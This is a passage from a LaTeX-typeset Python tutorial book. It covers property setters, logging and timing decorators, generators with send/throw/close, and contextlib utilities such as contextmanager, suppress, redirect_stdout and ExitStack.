        \VariableTok{self}\NormalTok{.\_value }\OperatorTok{=}\NormalTok{ value}

    \AttributeTok{@property}
    \KeywordTok{def}\NormalTok{ value(}\VariableTok{self}\NormalTok{):}
        \ControlFlowTok{return} \VariableTok{self}\NormalTok{.\_value}

    \AttributeTok{@value.setter}
    \KeywordTok{def}\NormalTok{ value(}\VariableTok{self}\NormalTok{, new\_value):}
        \ControlFlowTok{if}\NormalTok{ new\_value }\OperatorTok{\textless{}} \DecValTok{0}\NormalTok{:}
            \ControlFlowTok{raise} \PreprocessorTok{ValueError}\NormalTok{(}\StringTok{"Value cannot be negative"}\NormalTok{)}
        \VariableTok{self}\NormalTok{.\_value }\OperatorTok{=}\NormalTok{ new\_value}

\NormalTok{obj }\OperatorTok{=}\NormalTok{ MyClass(}\DecValTok{10}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(obj.value)}
\NormalTok{obj.value }\OperatorTok{=} \DecValTok{20}
\BuiltInTok{print}\NormalTok{(obj.value)}
\end{Highlighting}
\end{Shaded}

\section{Practical Examples}\label{practical-examples-4}

\subsection{Logging Decorator}\label{logging-decorator}

A logging decorator can be used to log function calls.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ logging}

\KeywordTok{def}\NormalTok{ log(func):}
    \KeywordTok{def}\NormalTok{ wrapper(}\OperatorTok{*}\NormalTok{args, }\OperatorTok{**}\NormalTok{kwargs):}
\NormalTok{        logging.info(}\SpecialStringTok{f"Running }\SpecialCharTok{\{}\NormalTok{func}\SpecialCharTok{.}\VariableTok{\_\_name\_\_}\SpecialCharTok{\}}\SpecialStringTok{ with }\SpecialCharTok{\{}\NormalTok{args}\SpecialCharTok{\}}\SpecialStringTok{ and }\SpecialCharTok{\{}\NormalTok{kwargs}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
        \ControlFlowTok{return}\NormalTok{ func(}\OperatorTok{*}\NormalTok{args, }\OperatorTok{**}\NormalTok{kwargs)}
    \ControlFlowTok{return}\NormalTok{ wrapper}

\AttributeTok{@log}
\KeywordTok{def}\NormalTok{ multiply(x, y):}
    \ControlFlowTok{return}\NormalTok{ x }\OperatorTok{*}\NormalTok{ y}

\NormalTok{logging.basicConfig(level}\OperatorTok{=}\NormalTok{logging.INFO)}
\BuiltInTok{print}\NormalTok{(multiply(}\DecValTok{2}\NormalTok{, }\DecValTok{3}\NormalTok{))}
\end{Highlighting}
\end{Shaded}

\subsection{Timing Decorator}\label{timing-decorator}

A timing decorator can be used to measure the execution time of a
function.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ time}

\KeywordTok{def}\NormalTok{ timing(func):}
    \KeywordTok{def}\NormalTok{ wrapper(}\OperatorTok{*}\NormalTok{args, }\OperatorTok{**}\NormalTok{kwargs):}
\NormalTok{        start }\OperatorTok{=}\NormalTok{ time.time()}
\NormalTok{        result }\OperatorTok{=}\NormalTok{ func(}\OperatorTok{*}\NormalTok{args, }\OperatorTok{**}\NormalTok{kwargs)}
\NormalTok{        end }\OperatorTok{=}\NormalTok{ time.time()}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"}\SpecialCharTok{\{}\NormalTok{func}\SpecialCharTok{.}\VariableTok{\_\_name\_\_}\SpecialCharTok{\}}\SpecialStringTok{ took }\SpecialCharTok{\{}\NormalTok{end }\OperatorTok{{-}}\NormalTok{ start}\SpecialCharTok{:.4f\}}\SpecialStringTok{ seconds"}\NormalTok{)}
        \ControlFlowTok{return}\NormalTok{ result}
    \ControlFlowTok{return}\NormalTok{ wrapper}

\AttributeTok{@timing}
\KeywordTok{def}\NormalTok{ calculate\_sum(n):}
    \ControlFlowTok{return} \BuiltInTok{sum}\NormalTok{(}\BuiltInTok{range}\NormalTok{(n))}

\BuiltInTok{print}\NormalTok{(calculate\_sum(}\DecValTok{1000000}\NormalTok{))}
\end{Highlighting}
\end{Shaded}

\section{Best Practices}\label{best-practices-3}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{Use \texttt{functools.wraps}}: Use \texttt{functools.wraps} to
  preserve the original function's metadata when writing decorators.
\end{enumerate}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ functools }\ImportTok{import}\NormalTok{ wraps}

\KeywordTok{def}\NormalTok{ decorator(func):}
    \AttributeTok{@wraps}\NormalTok{(func)}
    \KeywordTok{def}\NormalTok{ wrapper(}\OperatorTok{*}\NormalTok{args, }\OperatorTok{**}\NormalTok{kwargs):}
        \ControlFlowTok{return}\NormalTok{ func(}\OperatorTok{*}\NormalTok{args, }\OperatorTok{**}\NormalTok{kwargs)}
    \ControlFlowTok{return}\NormalTok{ wrapper}
\end{Highlighting}
\end{Shaded}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\setcounter{enumi}{1}
\tightlist
\item
  \textbf{Keep It Simple}: Keep the decorator logic simple and focused
  on a single responsibility.
\item
  \textbf{Test Thoroughly}: Test decorators thoroughly to ensure they
  don't introduce bugs or side effects.
\item
  \textbf{Use Decorators Judiciously}: Avoid overusing decorators; they
  can make the code harder to understand if used excessively.
\end{enumerate}

\section{Conclusion}\label{conclusion-35}

Decorators are a powerful feature in Python that allows you to extend
and modify the behavior of functions and methods. By understanding how
to create and use function and class decorators, you can write more
modular, reusable, and maintainable code. This tutorial covered the
basics of decorators, including practical examples and best practices.
With this foundation, you can start exploring more advanced uses of
decorators in your Python projects.

\bookmarksetup{startatroot}

\chapter{Deep Dive into Python
Generators}\label{deep-dive-into-python-generators}

Generators are a powerful tool in Python that allows you to iterate over
a sequence of values lazily, meaning you generate the values on the fly
rather than storing them in memory all at once. This can lead to
significant performance improvements, especially when working with large
datasets or streams of data.

\section{Table of Contents}\label{table-of-contents-12}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \hyperref[introduction-to-generators]{Introduction to Generators}
\item
  \hyperref[creating-generators]{Creating Generators}
\item
  \hyperref[using-generators]{Using Generators}
\item
  \hyperref[generator-expressions]{Generator Expressions}
\item
  \hyperref[the-yield-statement]{The \texttt{yield} Statement}
\item
  \hyperref[advanced-generator-usage]{Advanced Generator Usage}

  \begin{itemize}
  \tightlist
  \item
    \hyperref[sending-values-to-generators]{Sending Values to
    Generators}
  \item
    \hyperref[throwing-exceptions-into-generators]{Throwing Exceptions
    into Generators}
  \item
    \hyperref[closing-generators]{Closing Generators}
  \end{itemize}
\item
  \hyperref[practical-examples]{Practical Examples}
\item
  \hyperref[comparison-with-iterators]{Comparison with Iterators}
\item
  \hyperref[performance-considerations]{Performance Considerations}
\item
  \hyperref[best-practices]{Best Practices}
\item
  \hyperref[conclusion]{Conclusion}
\end{enumerate}

\section{Introduction to Generators}\label{introduction-to-generators}

Generators provide a way to create iterators in Python. They are written
like regular functions but use the \texttt{yield} statement whenever
they want to return data. Each call to the generator's
\texttt{\_\_next\_\_()} method (which is implicitly called by the
\texttt{next()} function) resumes the function from where it left off
(it remembers all the data values and which statement was last
executed).

\section{Creating Generators}\label{creating-generators}

\subsection{Generator Functions}\label{generator-functions}

A generator function is defined like a normal function but uses the
\texttt{yield} statement instead of \texttt{return} to return a value.
Here's a simple example:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ simple\_generator():}
    \ControlFlowTok{yield} \DecValTok{1}
    \ControlFlowTok{yield} \DecValTok{2}
    \ControlFlowTok{yield} \DecValTok{3}

\NormalTok{gen }\OperatorTok{=}\NormalTok{ simple\_generator()}

\BuiltInTok{print}\NormalTok{(}\BuiltInTok{next}\NormalTok{(gen))  }\CommentTok{\# Output: 1}
\BuiltInTok{print}\NormalTok{(}\BuiltInTok{next}\NormalTok{(gen))  }\CommentTok{\# Output: 2}
\BuiltInTok{print}\NormalTok{(}\BuiltInTok{next}\NormalTok{(gen))  }\CommentTok{\# Output: 3}
\end{Highlighting}
\end{Shaded}

\subsection{Generator Expressions}\label{generator-expressions-1}

Generator expressions provide an easy and concise way to create
generators. They are similar to list comprehensions but use parentheses
instead of square brackets.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{gen\_exp }\OperatorTok{=}\NormalTok{ (x }\OperatorTok{*}\NormalTok{ x }\ControlFlowTok{for}\NormalTok{ x }\KeywordTok{in} \BuiltInTok{range}\NormalTok{(}\DecValTok{5}\NormalTok{))}

\BuiltInTok{print}\NormalTok{(}\BuiltInTok{next}\NormalTok{(gen\_exp))  }\CommentTok{\# Output: 0}
\BuiltInTok{print}\NormalTok{(}\BuiltInTok{next}\NormalTok{(gen\_exp))  }\CommentTok{\# Output: 1}
\BuiltInTok{print}\NormalTok{(}\BuiltInTok{next}\NormalTok{(gen\_exp))  }\CommentTok{\# Output: 4}
\end{Highlighting}
\end{Shaded}

\section{Using Generators}\label{using-generators}

Generators can be iterated over using a \texttt{for} loop, which
automatically handles the \texttt{StopIteration} exception.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ countdown(n):}
    \ControlFlowTok{while}\NormalTok{ n }\OperatorTok{\textgreater{}} \DecValTok{0}\NormalTok{:}
        \ControlFlowTok{yield}\NormalTok{ n}
\NormalTok{        n }\OperatorTok{{-}=} \DecValTok{1}

\ControlFlowTok{for}\NormalTok{ num }\KeywordTok{in}\NormalTok{ countdown(}\DecValTok{5}\NormalTok{):}
    \BuiltInTok{print}\NormalTok{(num)}
\end{Highlighting}
\end{Shaded}

\section{\texorpdfstring{The \texttt{yield}
Statement}{The yield Statement}}\label{the-yield-statement}

The \texttt{yield} statement is used to produce a value from the
generator and pause its execution. The next time \texttt{\_\_next\_\_()}
is called, the generator resumes execution immediately after the
\texttt{yield}.

\subsection{Example: Fibonacci
Sequence}\label{example-fibonacci-sequence}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ fibonacci(limit):}
\NormalTok{    a, b }\OperatorTok{=} \DecValTok{0}\NormalTok{, }\DecValTok{1}
    \ControlFlowTok{while}\NormalTok{ a }\OperatorTok{\textless{}}\NormalTok{ limit:}
        \ControlFlowTok{yield}\NormalTok{ a}
\NormalTok{        a, b }\OperatorTok{=}\NormalTok{ b, a }\OperatorTok{+}\NormalTok{ b}

\NormalTok{fib }\OperatorTok{=}\NormalTok{ fibonacci(}\DecValTok{10}\NormalTok{)}
\ControlFlowTok{for}\NormalTok{ num }\KeywordTok{in}\NormalTok{ fib:}
    \BuiltInTok{print}\NormalTok{(num)}
\end{Highlighting}
\end{Shaded}

\section{Advanced Generator Usage}\label{advanced-generator-usage}

\subsection{Sending Values to
Generators}\label{sending-values-to-generators}

You can send values to a generator using the \texttt{send()} method.
This can be useful for coroutines or advanced control flow.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ echo():}
    \ControlFlowTok{while} \VariableTok{True}\NormalTok{:}
\NormalTok{        received }\OperatorTok{=} \ControlFlowTok{yield}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f\textquotesingle{}Received: }\SpecialCharTok{\{}\NormalTok{received}\SpecialCharTok{\}}\SpecialStringTok{\textquotesingle{}}\NormalTok{)}

\NormalTok{gen }\OperatorTok{=}\NormalTok{ echo()}
\BuiltInTok{next}\NormalTok{(gen)  }\CommentTok{\# Prime the generator}
\NormalTok{gen.send(}\StringTok{\textquotesingle{}Hello\textquotesingle{}}\NormalTok{)  }\CommentTok{\# Output: Received: Hello}
\NormalTok{gen.send(}\StringTok{\textquotesingle{}World\textquotesingle{}}\NormalTok{)  }\CommentTok{\# Output: Received: World}
\end{Highlighting}
\end{Shaded}

\subsection{Throwing Exceptions into
Generators}\label{throwing-exceptions-into-generators}

You can throw exceptions into a generator using the \texttt{throw()}
method. This allows you to handle errors within the generator.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ generator():}
    \ControlFlowTok{try}\NormalTok{:}
        \ControlFlowTok{yield} \StringTok{\textquotesingle{}Normal execution\textquotesingle{}}
    \ControlFlowTok{except} \PreprocessorTok{ValueError}\NormalTok{:}
        \ControlFlowTok{yield} \StringTok{\textquotesingle{}Handling ValueError\textquotesingle{}}
    \ControlFlowTok{yield} \StringTok{\textquotesingle{}End\textquotesingle{}}

\NormalTok{gen }\OperatorTok{=}\NormalTok{ generator()}
\BuiltInTok{print}\NormalTok{(}\BuiltInTok{next}\NormalTok{(gen))  }\CommentTok{\# Output: Normal execution}
\BuiltInTok{print}\NormalTok{(gen.throw(}\PreprocessorTok{ValueError}\NormalTok{))  }\CommentTok{\# Output: Handling ValueError}
\BuiltInTok{print}\NormalTok{(}\BuiltInTok{next}\NormalTok{(gen))  }\CommentTok{\# Output: End}
\end{Highlighting}
\end{Shaded}

\subsection{Closing Generators}\label{closing-generators}

You can close a generator using the \texttt{close()} method. This raises
a \texttt{GeneratorExit} exception inside the generator to perform any
cleanup.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ generator():}
    \ControlFlowTok{try}\NormalTok{:}
        \ControlFlowTok{yield} \StringTok{\textquotesingle{}Running\textquotesingle{}}
    \ControlFlowTok{finally}\NormalTok{:}
        \BuiltInTok{print}\NormalTok{(}\StringTok{\textquotesingle{}Closing generator\textquotesingle{}}\NormalTok{)}

\NormalTok{gen }\OperatorTok{=}\NormalTok{ generator()}
\BuiltInTok{print}\NormalTok{(}\BuiltInTok{next}\NormalTok{(gen))  }\CommentTok{\# Output: Running}
\NormalTok{gen.close()  }\CommentTok{\# Output: Closing generator}
\end{Highlighting}
\end{Shaded}

\section{Practical Examples}\label{practical-examples-5}

\subsection{Reading Large Files}\label{reading-large-files}

Generators can be very useful when reading large files line by line, as
they allow you to process each line without loading the entire file into
memory.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ read\_large\_file(file\_path):}
    \ControlFlowTok{with} \BuiltInTok{open}\NormalTok{(file\_path) }\ImportTok{as} \BuiltInTok{file}\NormalTok{:}
        \ControlFlowTok{for}\NormalTok{ line }\KeywordTok{in} \BuiltInTok{file}\NormalTok{:}
            \ControlFlowTok{yield}\NormalTok{ line}

\ControlFlowTok{for}\NormalTok{ line }\KeywordTok{in}\NormalTok{ read\_large\_file(}\StringTok{\textquotesingle{}large\_file.txt\textquotesingle{}}\NormalTok{):}
\NormalTok{    process(line)}
\end{Highlighting}
\end{Shaded}

\subsection{Infinite Sequences}\label{infinite-sequences}

Generators can be used to create infinite sequences.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ infinite\_sequence():}
\NormalTok{    num }\OperatorTok{=} \DecValTok{0}
    \ControlFlowTok{while} \VariableTok{True}\NormalTok{:}
        \ControlFlowTok{yield}\NormalTok{ num}
\NormalTok{        num }\OperatorTok{+=} \DecValTok{1}

\ControlFlowTok{for}\NormalTok{ i }\KeywordTok{in}\NormalTok{ infinite\_sequence():}
    \BuiltInTok{print}\NormalTok{(i)}
    \ControlFlowTok{if}\NormalTok{ i }\OperatorTok{\textgreater{}=} \DecValTok{10}\NormalTok{:}
        \ControlFlowTok{break}
\end{Highlighting}
\end{Shaded}

\section{Comparison with Iterators}\label{comparison-with-iterators}

Generators are a simple way to create iterators. Unlike a regular
iterator, which requires you to define \texttt{\_\_iter\_\_()} and
\texttt{\_\_next\_\_()}, a generator function does this automatically.

\subsection{Iterator Class Example}\label{iterator-class-example}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{class}\NormalTok{ Counter:}
    \KeywordTok{def} \FunctionTok{\_\_init\_\_}\NormalTok{(}\VariableTok{self}\NormalTok{, low, high):}
        \VariableTok{self}\NormalTok{.current }\OperatorTok{=}\NormalTok{ low}
        \VariableTok{self}\NormalTok{.high }\OperatorTok{=}\NormalTok{ high}

    \KeywordTok{def} \FunctionTok{\_\_iter\_\_}\NormalTok{(}\VariableTok{self}\NormalTok{):}
        \ControlFlowTok{return} \VariableTok{self}

    \KeywordTok{def} \FunctionTok{\_\_next\_\_}\NormalTok{(}\VariableTok{self}\NormalTok{):}
        \ControlFlowTok{if} \VariableTok{self}\NormalTok{.current }\OperatorTok{\textgreater{}} \VariableTok{self}\NormalTok{.high:}
            \ControlFlowTok{raise} \PreprocessorTok{StopIteration}
        \ControlFlowTok{else}\NormalTok{:}
            \VariableTok{self}\NormalTok{.current }\OperatorTok{+=} \DecValTok{1}
            \ControlFlowTok{return} \VariableTok{self}\NormalTok{.current }\OperatorTok{{-}} \DecValTok{1}

\NormalTok{counter }\OperatorTok{=}\NormalTok{ Counter(}\DecValTok{1}\NormalTok{, }\DecValTok{5}\NormalTok{)}
\ControlFlowTok{for}\NormalTok{ num }\KeywordTok{in}\NormalTok{ counter:}
    \BuiltInTok{print}\NormalTok{(num)}
\end{Highlighting}
\end{Shaded}

\subsection{Equivalent Generator
Example}\label{equivalent-generator-example}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ counter(low, high):}
\NormalTok{    current }\OperatorTok{=}\NormalTok{ low}
    \ControlFlowTok{while}\NormalTok{ current }\OperatorTok{\textless{}=}\NormalTok{ high:}
        \ControlFlowTok{yield}\NormalTok{ current}
\NormalTok{        current }\OperatorTok{+=} \DecValTok{1}

\ControlFlowTok{for}\NormalTok{ num }\KeywordTok{in}\NormalTok{ counter(}\DecValTok{1}\NormalTok{, }\DecValTok{5}\NormalTok{):}
    \BuiltInTok{print}\NormalTok{(num)}
\end{Highlighting}
\end{Shaded}

\section{Performance Considerations}\label{performance-considerations}

Generators can lead to significant performance improvements by reducing
memory usage and allowing for lazy evaluation.

\subsection{Memory Efficiency}\label{memory-efficiency}

Generators do not store the entire sequence in memory. Instead, they
generate each value on the fly, which is much more memory efficient.

\subsection{Lazy Evaluation}\label{lazy-evaluation}

Generators are evaluated lazily, meaning they only produce values when
needed. This can improve performance, especially for large datasets or
infinite sequences.

\section{Best Practices}\label{best-practices-4}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{Use Generators for Large Datasets}: When working with large
  datasets, use generators to improve memory efficiency.
\item
  \textbf{Keep Generators Simple}: Keep your generator functions simple
  and focused on a single task.
\item
  \textbf{Use Generator Expressions}: Use generator expressions for
  simple cases where you would otherwise use a list comprehension.
\item
  \textbf{Handle Generator Cleanup}: Ensure proper cleanup of resources
  within generators using try/finally blocks or context managers.
\end{enumerate}

\section{Conclusion}\label{conclusion-36}

Generators are a powerful feature in Python that allow you to work with
sequences of data in a memory-efficient and performant way. By using
\texttt{yield}, you can create iterators with less code and more
readability. Advanced techniques like sending values, throwing
exceptions, and closing generators further extend their capabilities. By
following best practices and understanding the intricacies of
generators, you can write more efficient and elegant Python code.

\bookmarksetup{startatroot}

\chapter{\texorpdfstring{Deep Dive into the \texttt{contextlib} Python
Module}{Deep Dive into the contextlib Python Module}}\label{deep-dive-into-the-contextlib-python-module}

The \texttt{contextlib} module in Python provides utilities for working
with context managers and the \texttt{with} statement. Context managers
are used to properly manage resources such as file streams, network
connections, and locks by ensuring that resources are properly cleaned
up after use. The \texttt{contextlib} module helps simplify the creation
and management of these context managers.

\section{Table of Contents}\label{table-of-contents-13}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \hyperref[introduction-to-context-managers]{Introduction to Context
  Managers}
\item
  \hyperref[the-contextlib-module]{The \texttt{contextlib} Module}
\item
  \hyperref[using-contextlibcontextmanager]{Using
  \texttt{contextlib.contextmanager}}
\item
  \hyperref[the-closing-function]{The \texttt{closing} Function}
\item
  \hyperref[the-suppress-function]{The \texttt{suppress} Function}
\item
  \hyperref[the-redirect_stdout-and-redirect_stderr-functions]{The
  \texttt{redirect\_stdout} and \texttt{redirect\_stderr} Functions}
\item
  \hyperref[the-exitstack-class]{The \texttt{ExitStack} Class}
\item
  \hyperref[combining-context-managers]{Combining Context Managers}
\item
  \hyperref[practical-examples]{Practical Examples}
\item
  \hyperref[best-practices]{Best Practices}
\item
  \hyperref[conclusion]{Conclusion}
\end{enumerate}

\section{Introduction to Context
Managers}\label{introduction-to-context-managers}

A context manager is an object that defines the runtime context to be
established when executing a \texttt{with} statement. Common use cases
include opening and closing files, acquiring and releasing locks, and
establishing and tearing down network connections.

\subsection{Basic Example}\label{basic-example}

\begin{Shaded}
\begin{Highlighting}[]
\ControlFlowTok{with} \BuiltInTok{open}\NormalTok{(}\StringTok{\textquotesingle{}example.txt\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}w\textquotesingle{}}\NormalTok{) }\ImportTok{as} \BuiltInTok{file}\NormalTok{:}
    \BuiltInTok{file}\NormalTok{.write(}\StringTok{\textquotesingle{}Hello, world!\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

In this example, the file is automatically closed when the block inside
the \texttt{with} statement is exited, even if an exception occurs.

\section{\texorpdfstring{The \texttt{contextlib}
Module}{The contextlib Module}}\label{the-contextlib-module}

The \texttt{contextlib} module provides several utilities to help create
and manage context managers. It simplifies the process of writing and
using context managers.

\section{\texorpdfstring{Using
\texttt{contextlib.contextmanager}}{Using contextlib.contextmanager}}\label{using-contextlib.contextmanager}

The \texttt{contextmanager} decorator from the \texttt{contextlib}
module allows you to create a context manager using a generator
function. This approach is often more readable and concise than creating
a class-based context manager.

\subsection{Example}\label{example-30}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ contextlib }\ImportTok{import}\NormalTok{ contextmanager}

\AttributeTok{@contextmanager}
\KeywordTok{def}\NormalTok{ open\_file(}\BuiltInTok{file}\NormalTok{, mode):}
\NormalTok{    f }\OperatorTok{=} \BuiltInTok{open}\NormalTok{(}\BuiltInTok{file}\NormalTok{, mode)}
    \ControlFlowTok{try}\NormalTok{:}
        \ControlFlowTok{yield}\NormalTok{ f}
    \ControlFlowTok{finally}\NormalTok{:}
\NormalTok{        f.close()}

\ControlFlowTok{with}\NormalTok{ open\_file(}\StringTok{\textquotesingle{}example.txt\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}w\textquotesingle{}}\NormalTok{) }\ImportTok{as} \BuiltInTok{file}\NormalTok{:}
    \BuiltInTok{file}\NormalTok{.write(}\StringTok{\textquotesingle{}Hello, world!\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

In this example, the \texttt{open\_file} function is a context manager
that ensures the file is properly closed after use.

\section{\texorpdfstring{The \texttt{closing}
Function}{The closing Function}}\label{the-closing-function}

The \texttt{closing} function is a utility that ensures an object with a
\texttt{close} method is closed when the block inside the \texttt{with}
statement is exited.

\subsection{Example}\label{example-31}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ contextlib }\ImportTok{import}\NormalTok{ closing}
\ImportTok{import}\NormalTok{ urllib.request}

\ControlFlowTok{with}\NormalTok{ closing(urllib.request.urlopen(}\StringTok{\textquotesingle{}http://www.example.com\textquotesingle{}}\NormalTok{)) }\ImportTok{as}\NormalTok{ page:}
    \ControlFlowTok{for}\NormalTok{ line }\KeywordTok{in}\NormalTok{ page:}
        \BuiltInTok{print}\NormalTok{(line)}
\end{Highlighting}
\end{Shaded}

Here, the \texttt{closing} function ensures that the URL connection is
properly closed after use.

\section{\texorpdfstring{The \texttt{suppress}
Function}{The suppress Function}}\label{the-suppress-function}

The \texttt{suppress} function allows you to suppress specified
exceptions within a \texttt{with} statement. This is useful for ignoring
specific errors without interrupting the flow of your program.

\subsection{Example}\label{example-32}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ contextlib }\ImportTok{import}\NormalTok{ suppress}

\ControlFlowTok{with}\NormalTok{ suppress(}\PreprocessorTok{FileNotFoundError}\NormalTok{):}
    \BuiltInTok{open}\NormalTok{(}\StringTok{\textquotesingle{}non\_existent\_file.txt\textquotesingle{}}\NormalTok{)}

\BuiltInTok{print}\NormalTok{(}\StringTok{\textquotesingle{}File not found, but no exception was raised.\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

In this example, the \texttt{FileNotFoundError} is suppressed, so the
program continues running without interruption.

\section{\texorpdfstring{The \texttt{redirect\_stdout} and
\texttt{redirect\_stderr}
Functions}{The redirect\_stdout and redirect\_stderr Functions}}\label{the-redirect_stdout-and-redirect_stderr-functions}

The \texttt{redirect\_stdout} and \texttt{redirect\_stderr} functions
allow you to redirect the output of \texttt{stdout} and \texttt{stderr}
to another stream, such as a file.

\subsection{Example}\label{example-33}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ contextlib }\ImportTok{import}\NormalTok{ redirect\_stdout}

\ControlFlowTok{with} \BuiltInTok{open}\NormalTok{(}\StringTok{\textquotesingle{}output.txt\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}w\textquotesingle{}}\NormalTok{) }\ImportTok{as}\NormalTok{ f:}
    \ControlFlowTok{with}\NormalTok{ redirect\_stdout(f):}
        \BuiltInTok{print}\NormalTok{(}\StringTok{\textquotesingle{}This will be written to the file.\textquotesingle{}}\NormalTok{)}

\BuiltInTok{print}\NormalTok{(}\StringTok{\textquotesingle{}This will be written to the console.\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

Here, the \texttt{print} statement inside the \texttt{with} block is
redirected to the \texttt{output.txt} file.

\section{\texorpdfstring{The \texttt{ExitStack}
Class}{The ExitStack Class}}\label{the-exitstack-class}

The \texttt{ExitStack} class allows you to dynamically manage a stack of
context managers. This is useful when you need to enter and exit
multiple context managers in a flexible way.

\subsection{Example}\label{example-34}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ contextlib }\ImportTok{import}\NormalTok{ ExitStack}

\ControlFlowTok{with}\NormalTok{ ExitStack() }\ImportTok{as}\NormalTok{ stack:}
\NormalTok{    files }\OperatorTok{=}\NormalTok{ [stack.enter\_context(}\BuiltInTok{open}\NormalTok{(}\SpecialStringTok{f\textquotesingle{}file}\SpecialCharTok{\{}\NormalTok{i}\SpecialCharTok{\}}\SpecialStringTok{.txt\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}w\textquotesingle{}}\NormalTok{)) }\ControlFlowTok{for}\NormalTok{ i }\KeywordTok{in} \BuiltInTok{range}\NormalTok{(}\DecValTok{3}\NormalTok{)]}
    \ControlFlowTok{for}\NormalTok{ i, }\BuiltInTok{file} \KeywordTok{in} \BuiltInTok{enumerate}\NormalTok{(files):}
        \BuiltInTok{file}\NormalTok{.write(}\SpecialStringTok{f\textquotesingle{}This is file }\SpecialCharTok{\{}\NormalTok{i}\SpecialCharTok{\}}\SpecialStringTok{.\textquotesingle{}}\NormalTok{)}

\BuiltInTok{print}\NormalTok{(}\StringTok{\textquotesingle{}All files are closed.\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

In this example, the \texttt{ExitStack} manages multiple file context
managers, ensuring they are all properly closed.

\section{Combining Context Managers}\label{combining-context-managers}

You can use the \texttt{ExitStack} class to combine multiple context
managers into a single \texttt{with} statement.

\subsection{Example}\label{example-35}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ contextlib }\ImportTok{import}\NormalTok{ ExitStack}

\ControlFlowTok{with}\NormalTok{ ExitStack() }\ImportTok{as}\NormalTok{ stack:}
\NormalTok{    file1 }\OperatorTok{=}\NormalTok{ stack.enter\_context(}\BuiltInTok{open}\NormalTok{(}\StringTok{\textquotesingle{}file1.txt\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}w\textquotesingle{}}\NormalTok{))}
\NormalTok{    file2 }\OperatorTok{=}\NormalTok{ stack.enter\_context(}\BuiltInTok{open}\NormalTok{(}\StringTok{\textquotesingle{}file2.txt\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}w\textquotesingle{}}\NormalTok{))}
    \CommentTok{\# Perform operations on file1 and file2}

\BuiltInTok{print}\NormalTok{(}\StringTok{\textquotesingle{}Both files are closed.\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

Here, both \texttt{file1} and \texttt{file2} are managed by the
\texttt{ExitStack}, ensuring they are both properly closed.

\section{Practical Examples}\label{practical-examples-6}

\subsection{Creating a Temporary
Directory}\label{creating-a-temporary-directory}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ os}
\ImportTok{import}\NormalTok{ tempfile}
\ImportTok{from}\NormalTok{ contextlib }\ImportTok{import}\NormalTok{ contextmanager}

\AttributeTok{@contextmanager}
\KeywordTok{def}\NormalTok{ temporary\_directory():}
\NormalTok{    dirpath }\OperatorTok{=}\NormalTok{ tempfile.mkdtemp()}
    \ControlFlowTok{try}\NormalTok{:}
        \ControlFlowTok{yield}\NormalTok{ dirpath}
    \ControlFlowTok{finally}\NormalTok{:}
\NormalTok{        os.rmdir(dirpath)}

\ControlFlowTok{with}\NormalTok{ temporary\_directory() }\ImportTok{as}\NormalTok{ tempdir:}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f\textquotesingle{}Temporary directory created at }\SpecialCharTok{\{}\NormalTok{tempdir}\SpecialCharTok{\}}\SpecialStringTok{\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Timing Code Execution}\label{timing-code-execution}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ time}
\ImportTok{from}\NormalTok{ contextlib }\ImportTok{import}\NormalTok{ contextmanager}

\AttributeTok{@contextmanager}
\KeywordTok{def}\NormalTok{ timer():}
\NormalTok{    start }\OperatorTok{=}\NormalTok{ time.time()}
    \ControlFlowTok{yield}
\NormalTok{    end }\OperatorTok{=}\NormalTok{ time.time()}
